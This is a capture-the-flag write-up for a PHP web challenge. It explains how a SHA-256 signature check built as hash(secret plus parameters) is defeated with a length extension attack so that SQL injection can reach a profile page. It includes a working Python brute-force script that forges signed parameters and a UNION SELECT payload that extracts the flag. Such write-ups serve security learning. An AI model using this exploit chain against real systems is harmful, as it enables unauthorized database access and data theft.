## Solution
When we first open the website, we see a Jaga Authentication (predictable as above). 
![extended.png](./assets/extended.png)
With authentication, one usually thinks of SQL injection, and indeed we do see it is SQL injectable in the code base, as shown in the PHP (**BAD** langauage) snippet below. This can be found in `profile.php`
```php
$user = $db->prepare("SELECT * FROM j4g4_us3rs WHERE uid = '$uid'");
```

So now, what is `uid`? Following the code upstream, we see that it is a randomly generated hex string given on registering. And that 0 ensures we are not admin :(
```php
$uid = bin2hex(random_bytes(32));
$user = $db->prepare("INSERT INTO j4g4_us3rs (uid, username, password, role) VALUES (?, ?, ?, 0)");
$user->execute([$uid, $username, md5($password)]);
```

But look, uid is given as a url param when going to `profile.php`, so we can just inject our code there? Well no, that gives us a 404 error
![extended.png](./assets/extended_failed.png)
We need to dig deeper!

In `profile.php` we see this snippet of code
```php
$uri = explode('|', substr($_SERVER["REQUEST_URI"], strpos($_SERVER["REQUEST_URI"], "?") + 1));
$paramstr = urldecode($uri[0]);
$params = parse_url('?' . $paramstr);
parse_str($params['query'], $params);
$sig = $uri[1];

if ($sig !== hash("sha256", $SECRET . $paramstr)) {
	http_response_code(404);
	include('404.php');
	die();
}
```
We see that the `uid` parameter has a signature, such that when `SECRET . paramstr` is hashed using `sha-256`, we get `sig` again. `sig` is passed alongside the `uid` with a delimiter `|`. So the url we need should have the format

`http://localhost:3273/profile.php?uid=<$uid>|<$sig>`

Now we see that we cannot just replace uid with the SQL injection as there is a check with the hidden string `SECRET`. However, we could just extend (woah question name) the uid by appending the SQL injection to it, keeping some parts of the original string and its hash. Would this even work? YES.

## Length Extension Attack
A length extension attack can be done on `sha-256`, the hashing algorithm used to check against `sig`. It is basically crypto magic, and if you want to find out the details you can go [here](https://en.wikipedia.org/wiki/Length_extension_attack).
Here is how it works. 
> **The Attack**
> Using $M$ and $HASH(SECRET . M)$ and the length of $SECRET$.
> We can use get $HASH(SECRET.M.PADDING.E)$. 
> 
> $M$ is the original message, here it is the `uid`
> $SECRET$ is the secret string, which also appears here
> $PADDING$ is just some specific characters to perform the attack.
> $E$ is our message to append, which will be our SQL injection.

Using a [library](https://github.com/stephenbradshaw/hlextend) we found, we can perform the length extension attack and get our SQL injection signed. As for the lenght of $SECRET$, we just brute forced, since it is only from 16 to 32, and found that it works when the length is 28.
<u>Bruteforce Script</u>
```python
import hlextend, requests 

for i in range(16, 33): 
	sha = hlextend.new('sha256')
	print(i, requests.get("http://<site>/profile.php?" +
		sha.extend( "' or role=1--",
		"uid=b526a1e66e5cd6c998510ed8e36bb91ba247c11d2c39f191d25f52126d06e73b", 
		i,
		"953e3e0eb6e871a8c0f5441f11aca4723e3237d2ce5904d3f03915fbc050e99d" 
	) + '|' + sha.hexdigest()).text)
```

Afterwards we inserted our SQL injection (finally) and get our flag.
SQL Injection: `' UNION SELECT flag, flag, flag, flag, flag FROM j4g4_us3rs WHERE role=1--`
